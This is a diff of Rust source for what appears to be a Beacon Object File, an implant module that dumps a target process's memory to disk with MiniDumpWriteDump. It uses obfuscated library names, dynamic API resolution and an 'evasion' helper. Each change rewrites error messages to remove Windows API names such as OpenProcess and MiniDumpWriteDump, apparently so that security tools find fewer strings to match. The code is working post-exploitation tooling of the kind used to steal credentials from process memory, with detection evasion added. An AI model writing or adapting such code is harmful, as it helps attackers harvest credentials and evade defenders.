@@ -103,13 +103,13 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     // Load dbghelp.dll via DFR (name obfuscated)
     obf_cstr! { let dbghelp = c"dbghelp.dll"; }
     let h_dbg = unsafe { load_library_a(dbghelp.as_ptr() as *const i8) }
-        .map_err(|_| "LoadLibraryA resolve")?;
-    if h_dbg == 0 { return Err("LoadLibraryA(dbghelp) failed"); }
+        .map_err(|_| "lib load resolve")?;
+    if h_dbg == 0 { return Err("lib load failed"); }
 
     // Open target process
     let h_proc = unsafe { open_process(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid) }
-        .map_err(|_| "OpenProcess resolve")?;
-    if h_proc == 0 { return Err("OpenProcess failed (need SeDebugPrivilege?)"); }
+        .map_err(|_| "proc open resolve")?;
+    if h_proc == 0 { return Err("proc open failed"); }
 
     // Create output file (NUL-terminated on stack)
     let mut path_buf = [0u8; 512];
@@ -122,11 +122,11 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
             GENERIC_WRITE, 0, core::ptr::null_mut(),
             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0,
         )
-    }.map_err(|_| "CreateFileA resolve")?;
+    }.map_err(|_| "file open resolve")?;
     if h_file == 0 || h_file == INVALID_HANDLE {
         unsafe { let _ = close_handle(h_proc); };
         common::evasion::secure_zero(&mut path_buf);
-        return Err("CreateFileA failed");
+        return Err("file open failed");
     }
 
     // MiniDumpWriteDump
@@ -135,7 +135,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
             h_proc, pid, h_file, MINIDUMP_TYPE,
             core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
         )
-    }.map_err(|_| "MiniDumpWriteDump resolve")?;
+    }.map_err(|_| "dump write resolve")?;
 
     unsafe {
         let _ = close_handle(h_file);
@@ -144,7 +144,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
 
     common::evasion::secure_zero(&mut path_buf);
 
-    if rc == 0 { return Err("MiniDumpWriteDump failed"); }
+    if rc == 0 { return Err("dump write failed"); }
 
     let fp = common::hash::djb2(path_s.as_bytes());
     obf! { let ok = "dump written"; }
